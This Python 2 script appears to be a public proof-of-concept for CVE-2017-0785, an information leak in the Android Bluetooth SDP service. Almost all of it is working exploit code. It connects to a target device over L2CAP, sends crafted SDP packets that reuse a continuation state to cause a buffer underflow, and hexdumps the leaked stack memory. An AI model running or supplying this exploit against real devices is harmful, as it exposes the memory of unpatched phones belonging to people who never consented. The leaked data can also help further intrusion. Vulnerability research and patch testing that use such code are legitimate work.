#!/usr/bin/env python2

"""
This script demonstrates the CVE-2017-0785 information leak on android devices.

Requires the following packages not included in standard Python distributions:
    - pwn
    - pybluez
"""

import pwn
import re
import sys
import bluetooth as bt
from argparse import ArgumentParser

pwn.context.endian = 'big'
TARGET_RE = re.compile("([a-f0-9]{2}:){5}([a-f0-9]{2})", flags=re.IGNORECASE)
SDP_SERVICE_LONG = 0x0100
SDP_SERVICE_SHORT = 0x0001
MTU = 50

def construct_packet(service, continuation_state):
    """
    Construct a SDP message for `service` and continuation state `continuation_state`.
    This package can be used to trigger the vulnerability in order to get memory
    from the stack.

    Params:
        - `service` - Service ID for the package
        - `continuation_state` - Continuation state for the package. For the
                exploit to work this should be the continuation state of a
                response received by SDP for another service.

    Returns:
        Valid SDP package for the specified service ID.
    """
    pkt = '\x02\x00\x00'
    pkt += pwn.p16(7 + len(continuation_state))
    pkt += '\x35\x03\x19'
    pkt += pwn.p16(service)
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("TARGET", action="store", type=str, help="Bluetooth address of the target device")
    parser.add_argument("-n", "--no-skip-repeat", action="store_true", help="Prevent skipping repeated data by replacing lines with \"*\"")
    parser.add_argument("-c", "--count", action="store", type=int, required=False, default=30, help="Number of packets to send (more packets -> more data leaked)")
    args = parser.parse_args()

    if not TARGET_RE.match(args.TARGET):
        sys.exit("Argument TARGET needs to be of the form XX:XX:XX:XX:XX:XX where X is a hexadecimal character!")

    if args.count < 1:
        sys.exit("Argument --count must be a positive integer number!")

    p = pwn.log.progress('Exploiting')
    p.status('Creating L2CAP socket')

    # Create a L2CAP socket and set MTU
    sock = bt.BluetoothSocket(bt.L2CAP)
    bt.set_l2cap_mtu(sock, MTU)

    p.status('Connecting to target via L2CAP')
    # Try to initiate a connection to the target
    try:
        sock.connect((args.TARGET, 1))
    except bt.btcommon.BluetoothError as e:
        pwn.log.failure("Connection failed: %s" % e.message)
        sys.exit(1)

    # Send the first package for the long service without continuation state
    p.status('Sending packet 0')
    sock.send(construct_packet(SDP_SERVICE_LONG, '\x00'))
    data = sock.recv(MTU)

    if data[-3] != '\x02':
        pwn.log.failure('Invalid continuation state received.')
        sys.exit(1)

    leaked = str()
    # Send packages to the short service with the received continuation state of
    # the long service. This results in a state confusion and a buffer underflow.
    # The underflow causes the remote device to send data from the stack we
    # should not be able to see
    for i in range(1, args.count):
        p.status('Sending packet %d' % i)
        sock.send(construct_packet(SDP_SERVICE_SHORT, data[-3:]))
        data = sock.recv(MTU)
        leaked += data[9:-3]

    sock.close()
    p.success('Done')
    print pwn.hexdump(leaked, skip=not args.no_skip_repeat)
